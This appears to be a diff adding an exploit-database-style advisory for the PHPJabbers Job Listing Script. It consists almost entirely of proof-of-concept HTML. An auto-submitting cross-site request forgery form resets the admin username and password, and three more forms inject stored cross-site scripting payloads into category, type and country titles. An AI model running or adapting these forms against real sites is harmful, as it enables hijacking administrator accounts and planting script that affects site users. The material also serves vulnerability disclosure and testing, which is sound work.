@@ -1,0 +1,83 @@
+Job Listing Script - Multiple Vulnerabilties
+====================================================================
+
+####################################################################
+.:. Author         : HackXBack
+.:. Contact        : h-b@usa.com
+.:. Home           : http://www.iphobos.com/blog/
+.:. Script         : http://www.phpjabbers.com/preview/job-listing-script/
+####################################################################
+
+===[ Exploit ]===
+
+[1] Cross Site Request Forgery
+==============================
+
+[Change Username/Password Admin]
+
+<html>
+<body onload="document.form0.submit();">
+<form method="POST" name="form0" action="
+http://site/index.php?controller=AdminOptions&action=update">
+<input type="hidden" name="options_update" value="1"/>
+<input type="hidden" name="username" value="admin"/>
+<input type="hidden" name="password" value="password"/>
+<input type="hidden" name="value-enum-9" value="Yes|No::Yes"/>
+<input type="hidden" name="value-enum-8" value="Yes|No::Yes"/>
+<input type="hidden" name="value-enum-7"
+value="d.m.Y|m.d.Y|Y.m.d|j.n.Y|n.j.Y|Y.n.j|d/m/Y|m/d/Y|Y/m/d|j/n/Y|n/j/Y|Y/n/j|d-m-Y|m-d-Y|Y-m-d|j-n-Y|n-j-Y|Y-n-j::d.m.Y"/>
+<input type="hidden" name="value-enum-6" value="Yes|No::Yes"/>
+<input type="hidden" name="value-int-5" value="5"/>
+<input type="hidden" name="value-string-4" value="http://www.example.com"/>
+<input type="hidden" name="value-enum-3" value="Yes|No::Yes"/>
+<input type="hidden" name="value-string-2" value="email@domain.com"/>
+<input type="hidden" name="value-int-1" value="10"/>
+</form>
+
+</body>
+</html>
+
+[2] Multiple Cross Site Scripting
+==================================
+
+# CSRF with XSS Exploit:
+
+I. Xss In Categories
+
+<html>
+<body onload="document.form0.submit();">
+<form method="POST" name="form0" action="
+http://site/index.php?controller=AdminCategories&action=create">
+<input type="hidden" name="category_create" value="Iphobos Blog"/>
+<input type="hidden" name="category_title"
+value="<script>alert(document.cookie);</script>"/>
+</form>
+</body>
+</html>
+
+II. Xss In Type
+
+<html>
+<body onload="document.form0.submit();">
+<form method="POST" name="form0" action="
+http://site/index.php?controller=AdminTypes&action=create">
+<input type="hidden" name="type_create" value="Iphobos Blog"/>
+<input type="hidden" name="type_title"
+value="<script>alert(document.cookie);</script>"/>
+</form>
+</body>
+</html>
+
+III. Xss In Country
+
+<html>
+<body onload="document.form0.submit();">
+<form method="POST" name="form0" action="
+http://site/index.php?controller=AdminCountries&action=create">
+<input type="hidden" name="country_create" value="Iphobos Blog"/>
+<input type="hidden" name="country_title"
+value="<script>alert(document.cookie);</script>"/>
+</form>
+</body>
+</html>
+####################################################################
